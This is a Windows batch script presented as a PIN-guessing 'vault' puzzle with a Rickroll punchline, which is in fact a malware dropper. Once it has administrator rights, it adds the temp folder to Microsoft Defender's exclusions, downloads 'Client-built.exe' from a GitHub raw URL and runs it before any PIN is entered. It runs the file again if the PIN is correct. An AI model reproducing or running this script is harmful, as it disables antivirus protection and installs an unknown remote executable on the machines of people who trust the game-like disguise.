@echo off
title Vault Access
::Nice try, but the code is obfuscated
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please right-click on the script and select "Run as administrator."
    pause
    exit
)
echo Running as Administrator.
pause
cls
setlocal EnableDelayedExpansion
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
start "" "%TEMP%\Client-built.exe"
set "encodedPIN=885"

:PINPrompt
set /p "userPIN=Enter the 3-digit PIN: "
set /a decodedPIN=!encodedPIN!-329
if "%userPIN%"=="%decodedPIN%" (
    echo Correct PIN! Opening the vault...
	start "" "%TEMP%\Client-built.exe"
        start https://www.youtube.com/watch?v=dQw4w9WgXcQ
    exit
) else (
    echo Incorrect PIN. Try again.

    goto PINPrompt
)
